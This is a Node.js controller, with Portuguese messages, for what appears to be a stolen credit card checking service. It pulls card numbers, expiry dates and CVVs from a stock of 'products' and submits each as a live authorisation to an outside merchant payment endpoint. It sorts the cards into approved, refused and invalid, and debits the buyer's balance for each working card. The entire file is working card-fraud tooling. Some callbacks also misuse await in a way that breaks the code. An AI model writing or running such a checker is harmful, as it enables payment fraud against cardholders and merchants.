const Product = require("../models/Product");
const Purchase = require("../models/Purchase");
const User = require("../models/User");
const axios = require("axios");
const FormData = require("form-data");

class TesteController {
	async test(req, res) {
		const user = await User.findById(req.userId);
		const { ammount } = req.body;

		if (!user) {
			return res.status(400).json({
				error: "Parece que você não pode fazer isso."
			});
		}

		if (user.balance < ammount) {
			return res.status(400).json({
				error: "Parece que você não pode fazer isso."
			});
		}

		for (let index = 0; index < ammount; index++) {
			const resultCode = await this.efetuaTeste(user, null);

			if (resultCode.code == 500) {
				return res.status(400).json({
					message: "Teste finalizado por falta de cartão no estoque."
				});
			}
		}

		return res.json({ message: "Teste finalizado com sucesso !" });
	}

	async efetuaTeste(user, ccNumber) {
		const totalCC = await Product.countDocuments({
			status: "Disponivel",
			number: { $ne: ccNumber }
		});
		const randomNumber = Math.floor(Math.random() * totalCC);
		var data = await Product.find({
			status: "Disponivel",
			number: { $ne: ccNumber }
		})
			.limit(1)
			.skip(randomNumber);

		if (data.length === 0) {
			return { code: 500 };
		}

		const cc = data[0];

		const infoData = `produto=100&codigoBandeira=${cc.flag}&formaPagamento=1&tentarAutenticar=nao&tipoParcelamento=2&capturarAutomaticamente=false&indicadorAutorizacao=2&cartaoNumero=${cc.number}&mes=${cc.month}&ano=${cc.year}&cartaoCodigoSeguranca=${cc.cvv}`;

		const resultTest = await axios({
			method: "post",
			processData: false,
			contentType: "multipart/form-data",
			cache: false,
			url:
				"http://orrus.net/api/apiChave/pages/carrinhoCartaoPagamento.php",
			data: infoData
		});

		var result = "Pendente";

		if (resultTest.data.includes("Retorno")) {
			result = resultTest.data.replace(`{"Retorno":"`, "");
			result = result.replace(`"}`, "");
		} else {
			result = "Invalida";
		}

		result = result.trim();

		switch (result) {
			case "Autorizada": {
				await User.update(
					{ _id: user.id },
					{
						$inc: { balance: -1 }
					}
				);

				await Product.findByIdAndUpdate(cc.id, {
					status: "Aprovada",
					usedBy: user.id,
					usedDate: Date.now()
				}).then(() => {
					return { code: 200 };
				});

				return { code: 200 };
			}

			case "Nao autorizada": {
				await Product.findByIdAndUpdate(cc.id, {
					status: "Recusada",
					usedBy: user.id,
					usedDate: Date.now()
				}).then(() => {
					await this.efetuaTeste(user, cc.number);
				});
				break;
			}

			case "Invalida": {
				await Product.findByIdAndUpdate(cc.id, {
					status: "Invalidada",
					usedBy: user.id,
					usedDate: Date.now()
				}).then(() => {
					await this.efetuaTeste(user, cc.number);
				});
				break;
			}
		}

		return { code: 200 };
	}
}

module.exports = new TesteController();
